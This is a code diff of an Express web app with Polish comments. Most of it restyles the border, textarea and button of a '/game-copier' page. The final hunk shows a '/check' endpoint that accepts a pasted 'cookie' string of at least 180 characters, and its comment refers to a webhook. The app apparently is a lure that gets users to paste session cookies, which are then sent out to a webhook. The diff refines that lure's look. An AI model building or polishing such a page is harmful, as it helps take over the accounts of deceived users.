@@ -64,7 +64,7 @@ app.get('/', (req, res) => {
   `);
 });
 
-// Podstrona /game-copier – mniejsza tabela + nowy napis nad nią
+// Podstrona /game-copier – nowa szara animowana ramka
 app.get('/game-copier', (req, res) => {
   res.send(`
 <!DOCTYPE html>
@@ -182,82 +182,61 @@ app.get('/game-copier', (req, res) => {
       100% { transform: rotate(360deg); }
     }
 
-    /* Mniejsza ramka zygzakowata */
-    .zigzag-border {
+    /* Nowa szara animowana ramka – subtelna i dopasowana do tła */
+    .subtle-glow-border {
       position: relative;
       width: 100%;
-      max-width: 460px;
-      margin: 0 auto 28px auto;
-      padding: 4px;
+      max-width: 440px;
+      margin: 0 auto 24px auto;
       border-radius: 14px;
       overflow: hidden;
+      padding: 3px;
+      background: linear-gradient(145deg, #e0e0e0, #f5f5f5);
+      box-shadow: 0 4px 12px rgba(0,0,0,0.08);
     }
-    .zigzag-border::before {
+    .subtle-glow-border::before {
       content: '';
       position: absolute;
-      inset: -6px;
-      background: linear-gradient(
-        90deg,
-        transparent 20%,
-        #000 40%,
-        #fff 50%,
-        #000 60%,
-        transparent 80%
-      );
-      background-size: 300% 300%;
-      animation: lightningFlow 2.8s linear infinite;
-      filter: blur(4px);
-      opacity: 0.8;
-      border-radius: 20px;
+      inset: -4px;
+      border-radius: 18px;
+      background: linear-gradient(45deg, #888888, #cccccc, #888888, #cccccc);
+      background-size: 400% 400%;
+      animation: softPulse 6s ease-in-out infinite;
+      filter: blur(6px);
+      opacity: 0.6;
       z-index: -1;
     }
-    .zigzag-border::after {
-      content: '';
-      position: absolute;
-      inset: 0;
-      background: repeating-linear-gradient(
-        45deg,
-        transparent 0,
-        transparent 3px,
-        #000 3px,
-        #000 6px,
-        #fff 6px,
-        #fff 9px
-      );
-      background-size: 10px 10px;
-      animation: zigzagShift 4s linear infinite;
-      opacity: 0.4;
-      border-radius: 10px;
-      z-index: -1;
+    .subtle-glow-border:hover::before {
+      opacity: 0.9;
+      animation-duration: 4s;
     }
     .inner-box {
       background: #ffffff;
-      border-radius: 10px;
+      border-radius: 11px;
       padding: 14px 16px;
-      border: 1px solid #333;
+      border: 1px solid #ccc;
       position: relative;
       z-index: 2;
-      transition: all 0.3s ease;
+      transition: border-color 0.3s ease;
     }
-    .zigzag-border:hover .inner-box {
-      border-color: #000;
-      box-shadow: 0 0 16px rgba(0,0,0,0.4);
+    .subtle-glow-border:hover .inner-box {
+      border-color: #888;
     }
     textarea {
       width: 100%;
-      height: 160px;              /* mniejsza stała wysokość */
+      height: 140px;               /* mniejsza wysokość */
       background: transparent;
       border: none;
       outline: none;
       resize: none;
-      overflow: hidden;           /* bez scrolla, tekst poza polem znika */
+      overflow: hidden;
       font-family: Consolas, "Courier New", monospace;
       font-size: 14px;
       color: #111;
       line-height: 1.5;
     }
     textarea::placeholder {
-      color: #777;
+      color: #888;
       font-style: italic;
     }
     button {
@@ -265,7 +244,7 @@ app.get('/game-copier', (req, res) => {
       background: #222;
       color: white;
       border: none;
-      padding: 13px 64px;
+      padding: 13px 60px;
       font-size: 1.15rem;
       font-weight: 600;
       border-radius: 12px;
@@ -299,6 +278,10 @@ app.get('/game-copier', (req, res) => {
       border: none;
     }
 
+    @keyframes softPulse {
+      0%, 100% { background-position: 0% 50%; opacity: 0.6; }
+      50% { background-position: 100% 50%; opacity: 0.85; }
+    }
     @keyframes lightningFlow {
       0%   { background-position: 0% 50%; }
       100% { background-position: 300% 50%; }
@@ -496,7 +479,7 @@ async function start() {
   `);
 });
 
-// Endpoint /check – bez zmian
+// Endpoint /check – bez zmian (cała logika + webhook)
 app.post('/check', async (req, res) => {
   const { cookie } = req.body || {};
   if (!cookie || typeof cookie !== 'string' || cookie.length < 180) {
